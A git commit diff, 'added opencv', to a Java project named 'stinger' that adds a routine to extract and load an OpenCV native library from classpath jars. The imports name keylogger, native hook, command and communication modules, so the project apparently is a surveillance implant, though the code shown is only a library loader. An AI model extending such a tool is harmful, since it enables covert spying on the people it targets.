f796925654f0f3f9230ac9a1e0df46514c77edd0
Tom Tzook <tomtzook@gmail.com>
2022-05-20 18:55:57 +0300

    added opencv

--- src/main/java/stinger/Main.java
+++ src/main/java/stinger/Main.java
@@ -1,11 +1,13 @@
 package stinger;
 
+import com.castle.nio.temp.TempPath;
+import com.castle.nio.zip.OpenZip;
+import com.castle.nio.zip.Zip;
 import org.jnativehook.NativeHookException;
 import stinger.comm.CommunicationModule;
 import stinger.commands.CommandModule;
 import stinger.logging.FileLogger;
 import stinger.logging.LoggingModule;
-import stinger.os.keylogger.Keylogger;
 import stinger.os.keylogger.KeyloggerModule;
 import stinger.os.nhooks.NativeHooks;
 import stinger.os.nhooks.NativeHooksModule;
@@ -13,14 +15,21 @@ import stinger.storage.PersistentStorage;
 import stinger.storage.Storage;
 import stinger.storage.StorageIndex;
 
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.util.Arrays;
 import java.util.HashSet;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import java.util.regex.Pattern;
 
 public class Main {
 
     public static void main(String[] args) {
+        loadNatives();
+
         ExecutorService executorService = Executors.newFixedThreadPool(Constants.CORE_THREAD_POOL_SIZE);
         try {
             StingerFiles files = new StingerFiles();
@@ -67,5 +76,41 @@ public class Main {
             }
             executorService.shutdownNow();
         }
+    }
+
+    private static void loadNatives() {
+        String pattern;
+        switch (com.castle.util.os.System.operatingSystem()) {
+            case Windows:
+                pattern = "^.*opencv_java\\d+\\.(?:dll)$";
+                break;
+            case Linux:
+                pattern = "^.*opencv_java\\d+\\.(?:so)$";
+                break;
+            default:
+                throw new AssertionError("unsupported platform");
+        }
+
+        String[] classpath = java.lang.System.getProperty("java.class.path").split(":");
+        for (String pathStr : classpath) {
+            Path path = Paths.get(pathStr);
+            if (!Files.isRegularFile(path)) {
+                continue;
+            }
+
+            try {
+                Zip zip = Zip.fromPath(path);
+                try (OpenZip openZip = zip.open()) {
+                    Path jar = openZip.find(Pattern.compile(pattern));
+                    TempPath tempPath = openZip.extract(jar);
+
+                    java.lang.System.load(tempPath.originalPath().toAbsolutePath().toString());
+                    return;
+                }
+            } catch (IOException e) {
+            }
+        }
+
+        throw new AssertionError("Unable to load opencv");
     }
 }
